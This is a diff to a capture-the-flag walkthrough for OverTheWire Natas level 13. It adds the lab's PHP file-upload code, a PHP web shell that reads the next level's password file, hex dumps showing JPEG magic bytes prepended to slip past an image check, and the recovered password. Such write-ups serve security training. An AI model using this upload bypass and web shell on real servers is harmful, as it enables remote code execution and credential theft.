@@ -576,12 +576,84 @@ https://overthewire.org/wargames/natas/natas13.html
 
 > URL:      http://natas13.natas.labs.overthewire.org
 
-```python
+**FileUpdload Source Code**
+```php
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";    
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+    $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+    
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo "The uploaded file exceeds MAX_FILE_SIZE";
+        } else{
+            echo "Something went wrong :/";
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+}
 ```
+
+```php
+echo "<?php echo system(\"cat /etc/natas_webpass/natas14\"); ?>" > natas13.jpg
+hexeditor -b natas13.jpg
+```
+
+**Creating an fake jpg natas13.jpg**
+
+```
+00000000  3C 3F 70 68  70 20 65 63   68 6F 20 73  79 73 74 65                                             <?php echo syste
+00000010  6D 28 2F 65  74 63 2F 6E   61 74 61 73  5F 77 65 62                                             m(/etc/natas_web
+00000020  70 61 73 73  2F 6E 61 74   61 73 31 34  29 3B 20 3F                                             pass/natas14); ?
+00000030  3E 0A                                                                                           >.
+```
+
+```
+00000000  FF D8 FF DB  3C 3F 70 68   70 20 65 63  68 6F 20 73                                             ....<?php echo s
+00000010  79 73 74 65  6D 28 2F 65   74 63 2F 6E  61 74 61 73                                             ystem(/etc/natas
+00000020  5F 77 65 62  70 61 73 73   2F 6E 61 74  61 73 31 34                                             _webpass/natas14
+00000030  29 3B 20 3F  3E 0A                                                                              ); ?>.
+```
+**"FF D8 FF DB" needs to be added at the start**
+
+CI no phyton Code is needed
 
 **Output**
 
 ```html
+����Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
 ```
 
 ## Natas14
@@ -592,6 +664,24 @@ https://overthewire.org/wargames/natas/natas14.html
 > Username: natas14
 
 > URL:      http://natas14.natas.labs.overthewire.org
+
+```python
+```
+
+**Output**
+
+```html
+```
+
+
+## Natas15
+https://overthewire.org/wargames/natas/natas15.html
+
+> Natas Level 14 → Level 15
+
+> Username: natas15
+
+> URL:      http://natas15.natas.labs.overthewire.org
 
 ```python
 ```
